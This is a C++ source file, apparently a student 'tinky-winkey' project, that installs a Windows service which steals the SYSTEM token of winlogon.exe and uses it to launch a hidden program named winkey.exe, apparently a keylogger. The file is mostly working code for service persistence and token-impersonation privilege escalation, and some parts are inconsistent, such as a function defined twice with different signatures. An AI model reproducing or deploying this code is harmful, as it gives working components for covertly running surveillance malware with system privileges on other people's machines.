#include <windows.h>
#include <tchar.h>
#include <iostream>
#include "tinky.h"
#include <Tlhelp32.h>


SC_HANDLE               scmH;
SC_HANDLE               serviceH;
SERVICE_STATUS_HANDLE   g_StatusHandle;
SERVICE_STATUS          g_ServiceStatus;
HANDLE                  g_ServiceStopEvent;
HANDLE                  newExecToken;
PROCESS_INFORMATION     winkeyPI;


void usage() {
    printf("Usage: svc [install, delete, start, stop] 1 arg at the time\n");
}

int Open_SCManager() {
    scmH = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (NULL == scmH)
    {
        printf("OpenSCManager failed (%d)\n", GetLastError());
        return(0);
    }
    return(1);
}

int OpenSvc() {
    serviceH = OpenService(
        scmH,       // SCM database 
        SVCNAME,    // name of service 
        GENERIC_ALL      // need delete access 
    );

    if (serviceH == NULL)
    {
        printf("OpenService failed (%d)\n", GetLastError());
        CloseServiceHandle(scmH);
        return(0);
    }
    return(1);
}

void DeleteSvc()
{
    if (OpenSvc()) {
        if (!DeleteService(serviceH))
        {
            printf("DeleteService failed (%d)\n", GetLastError());
        }
        else printf("Service deleted successfully\n");
    }
    else {
        printf("Service not installed\n");
    }
    CloseServiceHandle(serviceH);
}

void SvcInstall()
{
    SC_HANDLE schService;
    char Path[260];


    if (!GetCurrentDirectory(260, Path))
    {
        printf("Cannot install service (%d)\n", GetLastError());
        return;
    }
    strcat(Path, "\\tinky.exe");

    schService = CreateService(
        scmH,              // SCM database 
        SVCNAME,                   // name of service 
        SVCNAME,                   // service name to display 
        SERVICE_ALL_ACCESS,        // desired access 
        SERVICE_WIN32_OWN_PROCESS, // service type 
        SERVICE_DEMAND_START,      // start type 
        SERVICE_ERROR_NORMAL,      // error control type 
        Path,                      // path to service's binary 
        NULL,                      // no load ordering group 
        NULL,                      // no tag identifier 
        NULL,                      // no dependencies 
        NULL,                      // LocalSystem account 
        NULL                       // no password 
    );

    if (schService == NULL)
    {
        printf("Create Service failed (%d)\n", GetLastError());
        CloseServiceHandle(scmH);
        return;
    }

    else printf("Service installed successfully\n");

    CloseServiceHandle(schService);
}

void StartSvc() {
    if (!StartService(serviceH, 0, NULL)) {
        printf("Start Service failed (%d)\n", GetLastError());
    }
}

void StopSvc() {
    if (!ControlService(serviceH, SERVICE_CONTROL_STOP, &g_ServiceStatus)) {
        printf("Stop Service failed (%d)\n", GetLastError());
    }
}

DWORD GetPidByName(const char* filename)
{
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(PROCESSENTRY32);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        if (strcmp(pEntry.szExeFile, filename) == 0)
        {
            printf("%lu", pEntry.th32ProcessID);
            CloseHandle(hSnapShot);
            return(pEntry.th32ProcessID);
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
    return(0);
}

int main(int argc, CHAR **argv)
{
    if (argc == 2) {
        if (!Open_SCManager()) {
            printf("Please run as administrator.\n");
            exit(0);
        }
        //if (argc != 2) {
         //   usage();
        //}
        if (!strcmp("install", argv[1]))
        {
            SvcInstall();
            return 0;
        }
        else if (!strcmp("delete", argv[1]))
        {
            if (OpenSvc()) {
                DeleteSvc();
            }
            else {
                printf("Service not installed!\n");
            }
        }
        else if (!strcmp("start", argv[1]))
        {
            if (OpenSvc()) {
                StartSvc();
            }
            else {
                printf("Service not installed!\nTry svc install.\n");
            }
        }
        else if (!strcmp("stop", argv[1]))
        {
            if (OpenSvc()) {
                StopSvc();
            }
            else {
                printf("Service not installed!\nTry svc install.\n");
            }
        }
        else {
            usage();
        }
        CloseServiceHandle(scmH);
        CloseServiceHandle(serviceH);
    }
    else {
        SERVICE_TABLE_ENTRY ServiceTable[] =
        {
            {SVCNAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
            {NULL, NULL}
        };
        if (StartServiceCtrlDispatcher(ServiceTable))
            return 0;
        else if (GetLastError() == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT)
            return -1; // Program not started as a service.
        else
            return -2; // Other error.
    }
}

DWORD GetPidByName()
{
    char* filename = "winlogon.exe";
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(PROCESSENTRY32);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        if (strcmp(pEntry.szExeFile, filename) == 0)
        {
            printf("%lu", pEntry.th32ProcessID);
            CloseHandle(hSnapShot);
            return(pEntry.th32ProcessID);
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
    return(0);
}

void    Tinky_Winky() {
    DWORD winlogonPID;
    HANDLE wlPH;
    HANDLE wlTH;
    HANDLE newExecToken;
    char Path[260];
    LPWSTR PP = L"C:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";

    winlogonPID = GetPidByName();
    wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
    if (!OpenProcessToken(wlPH, TOKEN_DUPLICATE, &wlTH)) {
        printf("opt\n");
    }
    CloseHandle(wlPH);
    if (!DuplicateTokenEx(wlTH, TOKEN_DUPLICATE, NULL, SecurityImpersonation, TokenPrimary, &newExecToken)) {
        printf("dtEx\n");
    }
    CloseHandle(wlTH);
    GetCurrentDirectory(260, Path);
    strcat(Path, "\\winkey.exe 1337");
    int i = 0;

    if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
        printf("cpwt\n");
    }
}

VOID WINAPI ServiceMain() {
    DWORD Status = E_FAIL;

    g_StatusHandle = RegisterServiceCtrlHandler(SVCNAME, ServiceCtrlHandler);
    if (g_StatusHandle == NULL) {
        printf("Failed to register Service control handler to SCM\n");
        return;
    }
    ReportStatus(SERVICE_START_PENDING, NO_ERROR);
    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL) {
        ReportStatus(SERVICE_STOPPED, GetLastError());
        return;
    }
    ReportStatus(SERVICE_RUNNING, NO_ERROR);
    // execute winkey here
    Tinky_Winky();
    WaitForSingleObject(g_ServiceStopEvent, INFINITE);
    ReportStatus(SERVICE_STOPPED, NO_ERROR);
    return;
}

VOID WINAPI		ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
        case SERVICE_CONTROL_STOP:
            if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
                break;
            // stop winkey here
            ReportStatus(SERVICE_STOPPED, NO_ERROR);
            break;
        default:
            break;
    }
}

void ReportStatus(DWORD state, DWORD Q_ERROR) {
    /*
    * typedef struct _SERVICE_STATUS {
          DWORD dwServiceType;
          DWORD dwCurrentState;
          DWORD dwControlsAccepted;
          DWORD dwWin32ExitCode;
          DWORD dwServiceSpecificExitCode;
          DWORD dwCheckPoint;
          DWORD dwWaitHint;
       } SERVICE_STATUS, *LPSERVICE_STATUS;
     */
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = state == SERVICE_START_PENDING ? 0 : SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    g_ServiceStatus.dwCurrentState = state;
    g_ServiceStatus.dwWin32ExitCode = Q_ERROR;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    /*g_ServiceStatus = {
        SERVICE_WIN32_OWN_PROCESS,
        state,
        state == SERVICE_START_PENDING ? 0 : SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN,
        Q_ERROR,
        0,
        0,
        0,
    };*/
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}
